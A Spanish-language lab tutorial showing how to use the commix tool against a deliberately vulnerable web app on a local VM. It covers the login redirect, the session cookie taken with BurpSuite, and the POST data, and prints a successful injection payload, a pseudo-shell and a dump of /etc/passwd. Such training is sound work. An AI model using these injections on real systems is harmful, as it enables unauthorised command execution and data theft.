---
icon: user-pen
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Explotación - Commix

Esta herramienta denominada `commix` es una de las referencias cuando podemos hablar de injecciones de comandos, es bastante famosa y se ha utilizado en charlas de conferencias dedicadas al `hacking`, no viene por defecto en `kali` por lo que tendremos que instalarla de la siguiente forma:

URL = [Commix GitHub](https://github.com/commixproject/commix)

```shell
sudo apt install commix
```

Ahora vamos a probar la herramienta con la siguiente pagina web que se encuentra en la maquina que instalamos en `VMWare` que esta en el puerto `1335`.

```
URL = http://192.168.5.211:1335/
```

Podremos entrar con las credenciales de:

```
User: admin
Pass: password
```

Nos vamos al apartado de `Command Injection` y dentro del mismo tendremos un campo el cual es vulnerable a `Command Injection`, por lo que podremos probar la herramienta en esta zona.

<figure><img src="../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

Pillamos la `URL` de la pagina en el apartado en el que estamos, que en mi caso es este:

```
URL = http://192.168.5.211:1335/vulnerabilities/exec/#
```

Por lo que vamos a utilizar la herramienta de la siguiente forma basica:

```shell
commix -u http://192.168.5.211:1335/vulnerabilities/exec
```

Pero vamos a ver ahora que cuando metemos eso directamente nos va a redirigir al `login` ya que se requiere una autenticacion en la pagina y la herramienta nos va a dar esa opcion de elegir, si le damos a que nos continue la redireccion veremos que escaneara el `login` y no nos dara nada, pero ahora veremos como autenticarnos de esta forma para que no nos falle.

Info:

```
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.0-stable
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2024 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[04:24:29] [info] Testing connection to the target URL. 
Got a 302 redirect to 'http://192.168.5.211:1335/login.php'. Do you want to follow? [Y/n] > y
[04:25:18] [info] Following redirection to 'http://192.168.5.211:1335/login.php'. 
[04:25:18] [info] Checking if the target is protected by some kind of WAF/IPS.
[04:25:18] [info] Performing identification (passive) tests to the target URL.
[04:25:18] [critical] No parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'.
```

Si queremos que vaya unos niveles mas altos de `fuzzeo` podremos especificarselo con el `--level` y en este caso le pondremos el `3` para que en vez de lo haga en la `URL` tambien lo haga con las peticiones de `HTTP` donde esta la informacion del `User-agent`, etc... Para ver si nos puede encontrar algo en el apartado de `login`.

```shell
commix -u http://192.168.5.211:1335/login.php --level 3
```

Info:

```
                                     __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.0-stable
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2024 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[04:28:59] [info] Testing connection to the target URL. 
[04:28:59] [info] Checking if the target is protected by some kind of WAF/IPS.
[04:28:59] [info] Performing identification (passive) tests to the target URL.
[04:28:59] [info] Setting HTTP Header parameter 'user-agent' for tests.
[04:28:59] [info] Performing heuristic (basic) tests to the HTTP Header parameter 'user-agent'.
[04:28:59] [warning] Heuristic (basic) tests shows that HTTP Header parameter 'user-agent' might not be injectable.
[04:28:59] [info] Testing the (results-based) classic command injection technique... (0.6%) 
Do you want to ignore the response HTTP error code '400' and continue the tests? [Y/n] > y
[04:29:22] [info] Testing the (results-based) classic command injection technique.           
[04:29:28] [info] Testing the (results-based) dynamic code evaluation technique.           
[04:29:28] [warning] It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.
[04:30:14] [info] Testing the (blind) time-based command injection technique.           
Enter what you want to use for writable directory (e.g. '/var/www/192.168.5.211/public_html/') > 
[04:30:26] [info] Trying to create a file in directory '/var/www/192.168.5.211/public_html/' for command execution output. 
Do you want to use URL 'http://192.168.5.211:1335/CWVZRO.txt' for command execution output? [Y/n] > 
It seems that you don't have permissions to read and/or write files in directory '/var/www/192.168.5.211/public_html/'.
Do you want to use the temporary directory ('/tmp/')? [Y/n] > 
[04:30:30] [info] Trying to create a file in directory '/tmp/' for command execution output. 
[04:30:30] [warning] It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.
[04:31:12] [info] Testing the (semi-blind) tempfile-based injection technique.           
[04:31:39] [info] Testing the (semi-blind) file-based command injection technique.           
[04:31:39] [warning] The tested HTTP Header parameter 'user-agent' does not seem to be injectable.
[04:31:39] [info] Setting HTTP Header parameter 'referer' for tests.
[04:31:39] [info] Performing heuristic (basic) tests to the HTTP Header parameter 'referer'.
[04:31:39] [warning] Heuristic (basic) tests shows that HTTP Header parameter 'referer' might not be injectable.
[04:31:55] [info] Testing the (results-based) classic command injection technique.           
[04:32:04] [info] Testing the (results-based) dynamic code evaluation technique.           
[04:32:04] [warning] It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.
[04:32:48] [info] Testing the (blind) time-based command injection technique.           
It seems that you don't have permissions to read and/or write files in directory '/var/www/192.168.5.211/public_html/'.
Do you want to use the temporary directory ('/tmp/')? [Y/n] > 
[04:33:07] [info] Trying to create a file in directory '/tmp/' for command execution output. 
[04:33:07] [warning] It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.
[04:33:52] [info] Testing the (semi-blind) tempfile-based injection technique.           
[04:34:19] [info] Testing the (semi-blind) file-based command injection technique.           
[04:34:19] [warning] The tested HTTP Header parameter 'referer' does not seem to be injectable.
[04:34:19] [critical] All tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved, maybe you could try to use option '--tamper' and/or switch '--random-agent'.
```

Si nosotros paramos esta peticion con un `proxy` como puede ser `BurpSuite` vemos que en el `User-agent:` nos esta metiendo payloads los cuales es para ver si se puede ejeuctar comandos en el sistema victima.

Pero en este caso no encontramos ningun campo injectable.

Lo que podemos hacer para que nos detecte la aplicacion que estamos autenticados con la herramienta `commix` como antes hemos intentado hacer en la `URL` de la seccion de `Command Injection` podremos hacerlo de la siguiente forma:

Tendremos que abrir `BurpSuite` y en la seccion de `Proxy` darle a `Open Browser`, metemos la direccion de la pagina y nos logearemos, nos iremoa a la seccion de `Command Injection` y pondremos a `BurpSuite` a escucha cualquier peticion, recragamos la pagina y como podremos ver en la peticion capturada esta la `Cookie` de sesion que es la que podremos utilizar para que se nos autentique y asi no nos redireccione al `login`.

> Cookie

```
PHPSESSID=208meqdlm53fcn13t35sbrbqf4; security=low
```

Teniendo la `Cookie` copiada haremos lo siguiente:

```shell
commix -u http://192.168.5.211:1335/vulnerabilities/exec --cookie="PHPSESSID=208meqdlm53fcn13t35sbrbqf4; security=low"
```

Ahora esto no nos va a dar error y nos va a direccionar a la pagina correcta, pero no va a encontrar nada ya que va a escanear la peticion de `HTTP`, pero el campo que queremos que escane esta en el `Body`, por lo que tendremos que hacer lo siguiente:

Capturaremos la peticion con `BurpSuite` para ver como es el campo que se esta poniendo en el `Body` enviando la peticion de la seccion de `Command Injection` poniendo una `IP` cualquiera y cuando capturemos la peticion veremos que el campo es el siguiente:

> Campo Body

```
ip=192.168.5.200&Submit=Submit
```

Sabiendo esto, tendremos que hacer lo siguiente:

```shell
commix -u http://192.168.5.211:1335/vulnerabilities/exec --cookie="PHPSESSID=208meqdlm53fcn13t35sbrbqf4; security=low" --data="ip=192.168.5.200&Submit=Submit"
```

Info:

```
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.0-stable
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2024 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[04:45:40] [info] Testing connection to the target URL. 
Got a 301 redirect to 'http://192.168.5.211:1335/vulnerabilities/exec/'. Do you want to follow? [Y/n] > y
[04:45:42] [info] Following redirection to 'http://192.168.5.211:1335/vulnerabilities/exec/'. 
[04:45:42] [info] Checking if the target is protected by some kind of WAF/IPS.
[04:45:52] [info] Performing identification (passive) tests to the target URL.
[04:45:55] [warning] Target's estimated response time is 3 seconds. That may cause serious delays during the data extraction procedure and/or possible corruptions over the extracted data.
[04:45:55] [info] Setting POST parameter 'ip' for tests.
[04:45:55] [info] Performing heuristic (basic) tests to the POST parameter 'ip'.
[04:46:04] [info] Heuristic (basic) tests shows that POST parameter 'ip' might be injectable (possible OS: 'Unix-like').
[04:46:14] [info] Testing the (results-based) classic command injection technique.           
[04:46:14] [info] POST parameter 'ip' appears to be injectable via (results-based) classic command injection technique.
           |_ 192.168.5.200;echo EWNFUS$((46+28))$(echo EWNFUS)EWNFUS;
POST parameter 'ip' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > y
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

Vemos que nos ha funcionado, el `payload` exitoso fue el siguiente:

```
192.168.5.200;echo EWNFUS$((46+28))$(echo EWNFUS)EWNFUS;
```

Y por lo que vemos lo que esta haciendo es dejar la `IP` y concatenarlo con otro comando que casualmente se esta ejecutando en la maquina victima del servidor, por lo que luego nos pregunta si queremos tener una `falsa terminal` para poder ejecutar comandos, esto significa que lo que va hacer es que el comando que nosotros le enviemos el se va a encargar de volver a enviar la peticion con nuestro comando y la respuesta lo va a coger y pasarnoslo a notros de esta forma:

```
192.168.5.200;cat /etc/passwd;
```

Eso es lo que realmente estaria ejecutando cuando nosotros le enviamos ese comando, y como vemos estamos viendo el archivo `passwd` de forma correcta.
